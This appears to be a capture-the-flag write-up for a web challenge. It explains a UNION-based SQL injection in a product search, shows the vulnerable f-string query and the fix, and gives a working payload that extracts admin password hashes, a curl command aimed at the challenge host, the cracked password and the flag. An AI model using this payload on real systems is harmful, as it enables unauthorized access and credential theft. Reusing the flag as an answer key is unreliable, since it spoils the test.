---
title: "More than products"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: medium
author: "L-BOH"
---

# More than products

## Summary

The product search is UNION SQL injectable. We make the product list show the admin password hash, crack it, and use the ordinary admin login.

## Root cause

The product search constructs SQL with the submitted query:

~~~python
q = request.args.get('q')
query = f"SELECT * FROM products WHERE name LIKE '%{q}%'"
cursor.execute(query)
~~~

The quote around q is part of the query string. A submitted quote terminates it, allowing UNION SELECT to append rows from another table. Parameterized SQL would make q data instead of SQL syntax.

## Vulnerability

Searching with a quote affects the product list, showing that the search text changes an SQL query. The displayed product rows have four fields, so a UNION result must also provide four columns.

## Exploit

Search for:

~~~sql
' UNION SELECT 1,username,password,1 FROM users-- -
~~~

The application displays the username and password fields as if they were a product name and description. This reveals the admin account and its MD5 password hash.

Crack the hash with Hashcat mode 0, or just try in crackstation online. In the supplied deployment it resolves to:

~~~text
mofotrollop
~~~

Log in as admin with that password and visit /admin.

~~~bash
curl -G --data-urlencode "q=' UNION SELECT 1,username,password,1 FROM users-- -" \
  https://more-than-products.web2.friendly-ctf.securinets.tn/search
~~~

## Flag

~~~text
Securinets{uni0n_b4s3d_sql_inj3cti0n_4lways_funny}
~~~
